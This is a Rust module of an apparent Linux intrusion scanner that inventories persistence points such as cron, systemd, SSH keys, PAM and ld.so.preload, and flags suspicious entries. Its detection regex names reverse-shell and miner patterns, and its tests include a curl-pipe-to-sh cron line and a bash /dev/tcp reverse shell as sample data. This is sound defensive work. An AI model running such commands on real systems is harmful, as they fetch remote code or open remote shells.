//! Persistence inventory: users, SSH keys, cron, systemd, ld.so.preload,
//! PAM, profiles, sudoers, kernel modules. Every entry ends up in
//! "please confirm", anything suspicious additionally as a finding.

use std::sync::OnceLock;

use base64::Engine;
use regex::Regex;
use sha2::Digest;

use crate::{Category, Ctx, Severity};

fn suspicious_cmd() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(r"(?i)(?:curl|wget|fetch)\s[^|;]*\|\s*(?:ba|z|da)?sh\b|base64\s+(?:-d|--decode)|/dev/tcp/|/dev/udp/|\bnc\b[^|;]*\s-e\s|\bncat\b|\bsocat\b|python[0-9.]*\s+-c|perl\s+-e|bash\s+-i|/dev/shm/|(?:^|\s|/)tmp/\.|\bmkfifo\b|xmrig|minerd|kdevtmpfsi|kinsing|\.onion\b").unwrap()
    })
}

struct User {
    name: String,
    uid: u32,
    home: String,
    shell: String,
}

fn users(ctx: &Ctx) -> Vec<User> {
    let s = std::fs::read_to_string(ctx.p("/etc/passwd")).unwrap_or_default();
    s.lines()
        .filter_map(|l| {
            let f: Vec<&str> = l.split(':').collect();
            if f.len() < 7 {
                return None;
            }
            Some(User { name: f[0].into(), uid: f[2].parse().ok()?, home: f[5].into(), shell: f[6].into() })
        })
        .collect()
}

fn read_lines(p: &str) -> Vec<String> {
    std::fs::read_to_string(p)
        .map(|s| s.lines().map(str::to_string).collect())
        .unwrap_or_default()
}

fn active(l: &str) -> bool {
    let t = l.trim();
    !t.is_empty() && !t.starts_with('#')
}

/// OpenSSH fingerprint SHA256:… from an authorized_keys line.
pub fn key_fingerprint(line: &str) -> Option<(String, String, String)> {
    let parts: Vec<&str> = line.split_whitespace().collect();
    let idx = parts.iter().position(|p| p.starts_with("ssh-") || p.starts_with("ecdsa-") || p.starts_with("sk-"))?;
    let ktype = parts[idx].to_string();
    let blob = base64::engine::general_purpose::STANDARD.decode(parts.get(idx + 1)?).ok()?;
    let fp = base64::engine::general_purpose::STANDARD_NO_PAD.encode(sha2::Sha256::digest(&blob));
    let comment = parts[idx + 2..].join(" ");
    let opts = if idx > 0 { format!(" [options: {}]", parts[..idx].join(" ")) } else { String::new() };
    Some((ktype, format!("SHA256:{fp}"), format!("{comment}{opts}")))
}

pub fn check(ctx: &mut Ctx) {
    let us = users(ctx);
    // users
    for u in &us {
        if u.uid == 0 && u.name != "root" {
            ctx.add(Severity::Critical, Category::Persistence, "uid0_user", format!("Additional user with UID 0: {}", u.name), Some(ctx.p("/etc/passwd")), None);
        }
        let login = !(u.shell.ends_with("nologin") || u.shell.ends_with("false") || u.shell.is_empty() || u.shell.ends_with("sync"));
        if login {
            ctx.confirm("login_user", ctx.p("/etc/passwd"), format!("{} (uid {}, {})", u.name, u.uid, u.shell));
            if u.uid > 0 && u.uid < 1000 && !["sync", "halt", "shutdown"].contains(&u.name.as_str()) {
                let sev = if ["www-data", "nginx", "apache", "nobody", "mysql", "redis"].contains(&u.name.as_str()) { Severity::High } else { Severity::Low };
                ctx.add(sev, Category::Persistence, "system_user_shell", format!("System user with login shell: {}", u.name), Some(ctx.p("/etc/passwd")), Some(u.shell.clone()));
            }
        }
    }
    ssh_keys(ctx, &us);
    cron(ctx, &us);
    systemd(ctx, &us);
    loader(ctx);
    pam(ctx);
    profiles(ctx, &us);
    sudoers(ctx);
    modules(ctx);
}

fn ssh_keys(ctx: &mut Ctx, us: &[User]) {
    let mut homes: Vec<String> = us.iter().map(|u| u.home.clone()).collect();
    homes.push("/root".into());
    homes.sort();
    homes.dedup();
    let mut n = 0;
    for h in homes {
        for f in ["authorized_keys", "authorized_keys2"] {
            let p = ctx.p(&format!("{}/.ssh/{f}", h.trim_end_matches('/')));
            let lines = read_lines(&p);
            if lines.is_empty() {
                continue;
            }
            if f == "authorized_keys2" {
                ctx.add(Severity::Medium, Category::Persistence, "authorized_keys2", "Obsolete authorized_keys2 file (popular hiding place)", Some(p.clone()), None);
            }
            for l in lines.iter().filter(|l| active(l)) {
                n += 1;
                match key_fingerprint(l) {
                    Some((t, fp, c)) => {
                        if l.contains("command=") && suspicious_cmd().is_match(l) {
                            ctx.add(Severity::High, Category::Persistence, "ssh_key_command", "SSH key with suspicious command=", Some(p.clone()), Some(fp.clone()));
                        }
                        ctx.confirm("ssh_key", p.clone(), format!("{t} {fp} {c}"));
                    }
                    None => ctx.confirm("ssh_key", p.clone(), format!("unreadable line: {}", l.chars().take(60).collect::<String>())),
                }
            }
        }
    }
    ctx.stat("ssh_keys", n);
}

fn cron(ctx: &mut Ctx, _us: &[User]) {
    let mut files = vec![ctx.p("/etc/crontab")];
    for d in ["/etc/cron.d", "/var/spool/cron/crontabs", "/var/spool/cron", "/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"] {
        if let Ok(rd) = std::fs::read_dir(ctx.p(d)) {
            for e in rd.flatten() {
                if e.path().is_file() {
                    files.push(e.path().to_string_lossy().into_owned());
                }
            }
        }
    }
    let mut n = 0;
    for f in files {
        let rel = f.strip_prefix(ctx.cfg.sysroot.trim_end_matches('/')).unwrap_or(&f).to_string();
        let owned = ctx.pkgs.owns(&rel);
        let script_dir = rel.starts_with("/etc/cron.") && !rel.starts_with("/etc/cron.d");
        let content = std::fs::read_to_string(&f).unwrap_or_default();
        // an unmodified package cron job (e.g. certbot with "perl -e sleep") is not a finding
        let pristine = owned
            && ctx.pkgs.md5_for(&rel).zip(tyrosd_core::hash::md5_file(&f).ok()).map(|(a, b)| *a == b).unwrap_or(false);
        if !pristine && suspicious_cmd().is_match(&content) {
            // evidence with context: matching line ± 2 lines (at most 6 lines)
            let lines: Vec<&str> = content.lines().collect();
            let i = lines.iter().position(|l| suspicious_cmd().is_match(l)).unwrap_or(0);
            let ctx_lines: Vec<String> = lines[i.saturating_sub(2)..(i + 3).min(lines.len())]
                .iter()
                .enumerate()
                .map(|(k, l)| format!("{}{}: {}", if i.saturating_sub(2) + k == i { "→ " } else { "  " }, i.saturating_sub(2) + k + 1, l.chars().take(200).collect::<String>()))
                .take(6)
                .collect();
            // file belonging to a package (e.g. config file of a vendor repo), checksum not verifiable:
            // in the report, but no alert
            let sev = if owned { Severity::Medium } else { Severity::High };
            let owner = if owned { "\n(file belongs to an installed package)" } else { "" };
            ctx.add(sev, Category::Persistence, "cron_suspicious", "Cron job with suspicious command", Some(f.clone()), Some(format!("{}{owner}", ctx_lines.join("\n"))));
        }
        if script_dir {
            if !owned {
                ctx.confirm("cron_script", f.clone(), "Cron script without package");
                n += 1;
            }
            continue;
        }
        for l in content.lines().filter(|l| active(l)) {
            // skip variable assignments (MAILTO=, PATH=)
            if l.split_whitespace().next().map(|w| w.contains('=')).unwrap_or(false) {
                continue;
            }
            if owned && rel != "/etc/crontab" {
                continue; // package cron job, e.g. /etc/cron.d/php
            }
            n += 1;
            ctx.confirm("cron", f.clone(), l.trim().chars().take(200).collect::<String>());
        }
    }
    ctx.stat("cron_entries", n);
}

fn systemd(ctx: &mut Ctx, us: &[User]) {
    let mut dirs: Vec<String> = ["/etc/systemd/system", "/usr/lib/systemd/system", "/lib/systemd/system", "/usr/local/lib/systemd/system", "/run/systemd/system", "/etc/systemd/user"]
        .iter().map(|d| ctx.p(d)).collect();
    for u in us {
        dirs.push(ctx.p(&format!("{}/.config/systemd/user", u.home.trim_end_matches('/'))));
    }
    dirs.push(ctx.p("/root/.config/systemd/user"));
    let mut seen = std::collections::HashSet::new();
    let mut unknown = 0;
    for d in dirs {
        for e in walkdir::WalkDir::new(&d).max_depth(3).follow_links(false).into_iter().flatten() {
            let p = e.path().to_string_lossy().into_owned();
            if !(p.ends_with(".service") || p.ends_with(".timer") || p.ends_with(".socket") || p.ends_with(".path")) {
                continue;
            }
            if e.file_type().is_symlink() {
                continue; // activation links; the target is checked separately
            }
            if !seen.insert(p.clone()) {
                continue;
            }
            let rel = p.strip_prefix(ctx.cfg.sysroot.trim_end_matches('/')).unwrap_or(&p).to_string();
            let content = std::fs::read_to_string(&p).unwrap_or_default();
            let exec: Vec<&str> = content.lines().filter(|l| l.trim_start().starts_with("Exec")).collect();
            if exec.iter().any(|l| suspicious_cmd().is_match(l)) {
                ctx.add(Severity::High, Category::Persistence, "systemd_suspicious", "systemd unit with suspicious command", Some(p.clone()),
                    exec.iter().find(|l| suspicious_cmd().is_match(l)).map(|l| l.chars().take(200).collect()));
            }
            if !ctx.pkgs.owns(&rel) {
                unknown += 1;
                let start = exec.first().map(|l| l.trim().to_string()).unwrap_or_default();
                if exec.iter().any(|l| l.contains("/tmp/") || l.contains("/dev/shm") || l.contains("/var/tmp/")) {
                    ctx.add(Severity::High, Category::Persistence, "systemd_tmp", "systemd unit starts a program from a temporary directory", Some(p.clone()), Some(start.clone()));
                }
                ctx.confirm("systemd_unit", p, start.chars().take(200).collect::<String>());
            }
        }
    }
    ctx.stat("systemd_units_without_package", unknown);
}

fn loader(ctx: &mut Ctx) {
    let p = ctx.p("/etc/ld.so.preload");
    let content = std::fs::read_to_string(&p).unwrap_or_default();
    let lines: Vec<&str> = content.lines().filter(|l| active(l)).collect();
    if !lines.is_empty() {
        ctx.add(Severity::Critical, Category::Persistence, "ld_so_preload", "/etc/ld.so.preload is set (typical of userland rootkits)", Some(p), Some(lines.join(" ")));
    }
    if let Ok(rd) = std::fs::read_dir(ctx.p("/etc/ld.so.conf.d")) {
        for e in rd.flatten() {
            let fp = e.path().to_string_lossy().into_owned();
            let rel = fp.strip_prefix(ctx.cfg.sysroot.trim_end_matches('/')).unwrap_or(&fp).to_string();
            if !ctx.pkgs.owns(&rel) && ctx.pkgs.available() {
                ctx.confirm("ld_so_conf", fp, "Library path without package");
            }
        }
    }
}

fn pam(ctx: &mut Ctx) {
    let dirs = ["/lib/x86_64-linux-gnu/security", "/lib/aarch64-linux-gnu/security", "/usr/lib/x86_64-linux-gnu/security", "/usr/lib/aarch64-linux-gnu/security", "/lib64/security", "/usr/lib64/security", "/lib/security", "/usr/lib/security"];
    let Ok(rd) = std::fs::read_dir(ctx.p("/etc/pam.d")) else { return };
    let mut mods = std::collections::BTreeSet::new();
    for e in rd.flatten() {
        for l in read_lines(&e.path().to_string_lossy()) {
            if !active(&l) {
                continue;
            }
            for w in l.split_whitespace() {
                if w.ends_with(".so") {
                    mods.insert(w.to_string());
                }
            }
        }
    }
    for m in mods {
        let candidates: Vec<String> = if m.starts_with('/') { vec![m.clone()] } else { dirs.iter().map(|d| format!("{d}/{m}")).collect() };
        let found = candidates.iter().find(|c| std::path::Path::new(&ctx.p(c)).exists()).cloned();
        match found {
            Some(f) if ctx.pkgs.available() && !ctx.pkgs.owns(&f) => {
                ctx.add(Severity::Critical, Category::Persistence, "pam_module_unowned", "PAM module belongs to no package (possible login backdoor)", Some(ctx.p(&f)), None);
            }
            Some(f) => {
                if let Some(expected) = ctx.pkgs.md5_for(&f).cloned() {
                    if tyrosd_core::hash::md5_file(&ctx.p(&f)).map(|h| h != expected).unwrap_or(false) {
                        ctx.add(Severity::Critical, Category::Persistence, "pam_module_modified", "PAM module differs from package checksum", Some(ctx.p(&f)), None);
                    }
                }
            }
            None => {}
        }
    }
}

fn profiles(ctx: &mut Ctx, us: &[User]) {
    let mut files: Vec<String> = ["/etc/profile", "/etc/bash.bashrc", "/etc/bashrc", "/etc/zsh/zshrc", "/etc/environment", "/etc/rc.local"].iter().map(|f| ctx.p(f)).collect();
    if let Ok(rd) = std::fs::read_dir(ctx.p("/etc/profile.d")) {
        for e in rd.flatten() {
            let fp = e.path().to_string_lossy().into_owned();
            let rel = fp.strip_prefix(ctx.cfg.sysroot.trim_end_matches('/')).unwrap_or(&fp).to_string();
            if ctx.pkgs.available() && !ctx.pkgs.owns(&rel) {
                ctx.confirm("profile_script", fp.clone(), "Login script without package");
            }
            files.push(fp);
        }
    }
    let mut homes: Vec<String> = us.iter().map(|u| u.home.clone()).collect();
    homes.push("/root".into());
    for h in homes {
        for f in [".bashrc", ".profile", ".bash_profile", ".bash_login", ".zshrc", ".bash_logout"] {
            files.push(ctx.p(&format!("{}/{f}", h.trim_end_matches('/'))));
        }
    }
    files.sort();
    files.dedup();
    for f in files {
        let c = std::fs::read_to_string(&f).unwrap_or_default();
        if let Some(l) = c.lines().filter(|l| active(l)).find(|l| suspicious_cmd().is_match(l) || l.contains("LD_PRELOAD=")) {
            ctx.add(Severity::High, Category::Persistence, "profile_suspicious", "Suspicious command in shell profile", Some(f.clone()), Some(l.chars().take(200).collect()));
        }
        if f.ends_with("/etc/rc.local") && c.lines().any(|l| active(l) && l.trim() != "exit 0" && !l.starts_with("#!")) {
            ctx.confirm("rc_local", f.clone(), "rc.local contains commands");
        }
    }
}

fn sudoers(ctx: &mut Ctx) {
    let mut files = vec![ctx.p("/etc/sudoers")];
    if let Ok(rd) = std::fs::read_dir(ctx.p("/etc/sudoers.d")) {
        files.extend(rd.flatten().map(|e| e.path().to_string_lossy().into_owned()));
    }
    for f in files {
        for l in read_lines(&f).iter().filter(|l| active(l)) {
            if l.starts_with("Defaults") || l.starts_with("@include") || l.starts_with("#include") {
                continue;
            }
            if l.contains("NOPASSWD") && l.contains("ALL") {
                ctx.confirm("sudo_nopasswd", f.clone(), l.trim().to_string());
            } else if l.contains("ALL") {
                ctx.confirm("sudo", f.clone(), l.trim().to_string());
            }
        }
    }
}

fn modules(ctx: &mut Ctx) {
    if ctx.cfg.sysroot != "/" {
        return; // runtime check only on the live system
    }
    let rel = std::fs::read_to_string("/proc/sys/kernel/osrelease").unwrap_or_default().trim().to_string();
    let dep = std::fs::read_to_string(format!("/lib/modules/{rel}/modules.dep")).unwrap_or_default();
    let builtin = std::fs::read_to_string(format!("/lib/modules/{rel}/modules.builtin")).unwrap_or_default();
    if dep.is_empty() {
        ctx.report.notes.push("Kernel modules not checked (modules.dep missing, e.g. in a container)".into());
        return;
    }
    let norm = |s: &str| -> String {
        let b = s.rsplit('/').next().unwrap_or(s);
        b.split(".ko").next().unwrap_or(b).replace('-', "_")
    };
    let mut known: std::collections::HashSet<String> = dep.lines().filter_map(|l| l.split(':').next()).map(norm).collect();
    known.extend(builtin.lines().map(norm));
    let loaded = std::fs::read_to_string("/proc/modules").unwrap_or_default();
    for l in loaded.lines() {
        let name = l.split_whitespace().next().unwrap_or("");
        let tainted = l.contains("(O") || l.contains("(OE") || l.contains("(E");
        if !known.contains(name) {
            ctx.add(Severity::High, Category::Persistence, "kmod_unknown", format!("Loaded kernel module without a file in the module directory: {name}"), None, Some(l.chars().take(160).collect()));
        } else if tainted {
            ctx.confirm("kmod_out_of_tree", "/proc/modules", name.to_string());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn fingerprint() {
        // example key (public, test only)
        let l = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxhUwXi7CwcgL7Y0MQkKM6dTj8mGhPZJXH5R0Ws0f9J test@host";
        let (t, fp, c) = key_fingerprint(l).unwrap();
        assert_eq!(t, "ssh-ed25519");
        assert!(fp.starts_with("SHA256:"));
        assert_eq!(c, "test@host");
    }
    #[test]
    fn suspicious() {
        assert!(suspicious_cmd().is_match("* * * * * curl -fsSL http://x.example/a.sh | sh"));
        assert!(suspicious_cmd().is_match("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"));
        assert!(!suspicious_cmd().is_match("0 3 * * * /usr/bin/certbot renew --quiet"));
    }
}
